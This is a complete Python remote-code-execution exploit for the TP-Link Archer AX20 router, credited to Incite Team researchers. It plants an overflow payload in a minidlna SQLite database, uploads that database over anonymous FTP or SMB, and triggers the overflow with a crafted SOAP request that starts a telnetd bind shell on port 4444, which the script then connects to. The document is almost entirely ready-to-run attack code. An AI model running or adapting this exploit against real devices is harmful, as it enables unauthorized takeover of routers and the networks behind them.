#!/usr/bin/env python3
import os
import io
import sys
import time
import struct
import hashlib
import sqlite3
import requests
import argparse
from ftplib import FTP
from smb.SMBHandler import SMBHandler
import urllib.request
from colorama import Fore, Style

EXPECTED_HASH = "13b5db4fa126331aaab6fcb02b31a730932debfc2785767863982e551389614e"

def main():

    # Create argument parser
    parser = argparse.ArgumentParser(description="TP-Link AX1800 WiFi 6 Router (Archer AX20) RCE Exploit",
                                     epilog="By Rocco Calvi and Steven Seeley of Incite Team")

    # Add arguments
    parser.add_argument("target", help="The target IP address of the router")
    parser.add_argument("proto", choices=["ftp", "smb"], help="The protocol to exploit (ftp or smb)")

    # Parse arguments
    args = parser.parse_args()

    try:
        if len(sys.argv) != 3:
            print_usage()
            sys.exit(1)

        target, proto = args.target, args.proto.lower()

        if proto not in ['ftp', 'smb']:
            print(Fore.RED + "Invalid protocol! Use 'ftp' or 'smb'." + Style.RESET_ALL)
            print(Fore.YELLOW + "Supported protocols are 'ftp' and 'smb'. Example usage:" + Style.RESET_ALL)
            print(f"{sys.argv[0]} 192.168.0.1 ftp")
            print(f"{sys.argv[0]} 192.168.0.1 smb")
            sys.exit(1)

        prepare_target_stack()
        print(f"{Fore.GREEN}Uploading the database via {proto}...{Style.RESET_ALL}")
        upload_database(target, proto)

        check_and_trigger_vulnerability(target)

    except Exception as e:
        print(Fore.RED + f"An error occurred: {str(e)}" + Style.RESET_ALL)
        sys.exit(1)

def upload_database(target, proto):
    db_file = "files.db"
    if proto == 'ftp':
        upload_via_ftp(target, db_file)
    elif proto == 'smb':
        upload_via_smb(target, db_file)

def delete_existing_db():
    db_file = "files.db"
    if os.path.exists(db_file):
        try:
            os.remove(db_file)
        except OSError as e:
            print(f"Error: {e.filename} - {e.strerror}.")

def check_and_trigger_vulnerability(target):

    if is_target_vulnerable(target, 1337):
        print("Target is vulnerable!")
        trigger_overflow(target, "1337")
        print("Pop thy shell!")
        time.sleep(2.0)
        os.system(f"telnet {target} 4444")

def print_usage():
    print("---> TP-Link AX1800 WiFi 6 Router (Archer AX20) RCE Exploit <---")
    print("         By Rocco Calvi and Steven Seeley of Incite Team")
    print()
    print(f"Usage: python3 {sys.argv[0]} <target> <proto>")
    print("Examples:")
    print(f"  python3 {sys.argv[0]} 192.168.1.1 ftp")
    print(f"  python3 {sys.argv[0]} 192.168.1.1 smb")

def create_db_connection():
    conn = sqlite3.connect('files.db')
    return conn

def create_db_structure(conn):
    create_objects = "create table if not exists objects (id integer primary \
    key autoincrement, object_id text unique not null, parent_id text not \
    null, ref_id text default null, class text not null, detail_id integer \
    default null, name text default null)"
    create_details = "create table if not exists details (id integer primary \
    key autoincrement, path text default null, size integer, timestamp \
    integer, title text collate nocase, duration text, bitrate integer, \
    samplerate integer, creator text collate nocase, artist text collate \
    nocase, album text collate nocase, genre text collate nocase, comment \
    text, channels integer, disc integer, track integer, date date, \
    resolution text, thumbnail bool default 0, album_art integer default 0, \
    rotation integer, dlna_pn text, mime text)"
    create_album_art = "create table if not exists album_art (id integer \
    primary key autoincrement, path text not null)"
    cur = conn.cursor()
    cur.execute(create_objects)
    cur.execute(create_details)
    cur.execute(create_album_art)

def build_payload():
    initial_payload = b"AVC_TS_HP_HD_AC3"
    padding = b"A" * 136
    pc_address = struct.pack("I", 0x00015ed4)  # $pc
    remaining_padding = b"A" * (250 - len(initial_payload) - len(padding) - len(pc_address))

    payload = initial_payload + padding + pc_address + remaining_padding
    return payload

def insert_into_db(conn, buffer, object_id):
    cur = conn.cursor()
    sql_details = "insert or replace into details( \
    id, path, size, timestamp, title, duration, bitrate, samplerate, creator, \
    artist, album, genre, comment, channels, disc, track, date, resolution, \
    thumbnail, album_art, rotation, dlna_pn, mime) values(?, null, null, null, \
    null, null, null, null, null, null, null, null, null, null, null, null, null, \
    null, null, null, null, ?, 'vendetta')"
    cur.execute(sql_details, (object_id, buffer, ))
    sql_objects = "insert or replace into objects( \
    id, object_id, parent_id, ref_id, class, detail_id, name) values(null, ?, \
    '', null, 'item.videoItem', ?, null)"
    cur.execute(sql_objects, (object_id, object_id, ))
    cur.execute("insert into album_art (id, path) values (?, \
    '/usr/sbin/minidlnad');", (object_id,))

def upload_via_ftp(target, db_file):
    if not os.path.isfile(db_file):
        print(Fore.RED + f"(-) Failed to find the database file!{Style.RESET_ALL}")
        raise FileNotFoundError("(-) Failed to find the database file!")

    with FTP(target) as ftp:
        ftp.encoding = "utf-8"
        ftp.login()
        ftp.cwd('G/.TPDLNA')
        with open(db_file, 'rb') as fp:
            print(Fore.YELLOW + "Uploading file via FTP..." + Style.RESET_ALL)
            ftp.storbinary(f'STOR {db_file}', fp)
            print(Fore.GREEN + "File uploaded successfully!" + Style.RESET_ALL)

def upload_via_smb(target, db_file):
	# Set up the connection to the Samba share                                                                                                                                                                                                                                                                                                 
    share_name = "G"                                                                                                                                                                                                                                                                                                                           
    url = f"smb://{target}/{share_name}/.TPDLNA/{db_file}"                                                                                                                                                                                                                                                                                    
    with open(db_file, "rb") as local_file:                                                                                                                                                                                                                                                                                                 
        file_obj = io.BytesIO(local_file.read())                                                                                                                                                                                                                                                                                               
        opener = urllib.request.build_opener(SMBHandler)                                                                                                                                                                                                                                                                                       
        with opener.open(url, data=file_obj) as response:                                                                                                                                                                                                                                                                                      
            print(Fore.GREEN + "File uploaded successfully!" + Style.RESET_ALL)


def is_target_vulnerable(target, object_id):
    m = hashlib.sha256()
    url = f"http://{target}:8200/AlbumArt/{object_id}-si.jpg"

    try:
        # First request is used for caching, will return 404
        requests.get(url, timeout=5)

        # Process the hash check with the second request
        response = requests.get(url, timeout=5)
    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"Error while making requests: {e}" + Style.RESET_ALL)
        return False

    m.update(response.content)
    return m.hexdigest() == EXPECTED_HASH

def trigger_overflow(target, object_id):
    url = f"http://{target}:8200/ctl/ContentDir"
    h = {
        'x-av-client-info' : 'BRAVIA',
        'content-type'     : 'text/xml',
        'soapaction'       : 'urn:schemas-upnp-org:service:ContentDirectory:1#BrowseContentDirectory'
    }
    cmd = "/usr/sbin/telnetd -p4444 -l/bin/sh"
    # don't change this, its crafted to land the command on the stack at offset 0x180
    body = f"""<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" \
         s:rce="{cmd}\x00" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
        <s:Body><u:Browse xmlns:u="urn:schemas-upnp-org:service:ContentDirectory:1">
            <ObjectID>{object_id}</ObjectID>
            <BrowseFlag>BrowseMetadata</BrowseFlag>
                <Filter>*</Filter>
            </u:Browse>
        </s:Body>
    </s:Envelope>"""
    try:
        print(Fore.YELLOW + "Triggering the overflow..." + Style.RESET_ALL)
        requests.post(url, data=body, headers=h, timeout=5)
    except:
        pass

def prepare_target_stack():
    print("Preparing target stack...")
    
    delete_existing_db()
    
    conn = create_db_connection()
    if conn is None:
        return
    
    create_db_structure(conn)
    
    payload = build_payload()
    
    insert_into_db(conn, payload, "1337")
    
    conn.commit()
    conn.close()

if __name__ == "__main__":
    main()
